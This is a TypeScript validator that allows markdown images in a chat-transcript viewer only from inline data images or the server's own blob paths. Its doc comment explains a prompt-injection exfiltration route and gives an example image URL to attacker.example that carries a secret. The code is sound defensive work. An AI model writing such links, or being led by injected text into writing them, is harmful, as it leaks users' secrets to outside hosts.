const BLOB_PATH = /^\/api\/blob\/[a-f0-9]{64}$/;
const INLINE_IMAGE = /^data:image\//i;

/**
 * Whether a markdown image may load. Transcript text is attacker-influenced (a prompt injection can make
 * a model write `![x](https://attacker.example/?d=secret)`), and an <img> is fetched the moment it renders,
 * so only this server's stored attachments and inline images qualify. The source is judged as the browser
 * will resolve it, so `//host/…`, `/\host/…` and `/api/blob/../…` get no free pass.
 */
export function isAllowedImageSrc(src: string | undefined, origin: string): boolean {
	if (!src) return false;
	if (INLINE_IMAGE.test(src)) return true;
	let url: URL;
	try {
		url = new URL(src, `${origin}/`);
	} catch {
		return false;
	}
	return url.origin === origin && url.username === "" && url.password === "" && BLOB_PATH.test(url.pathname);
}
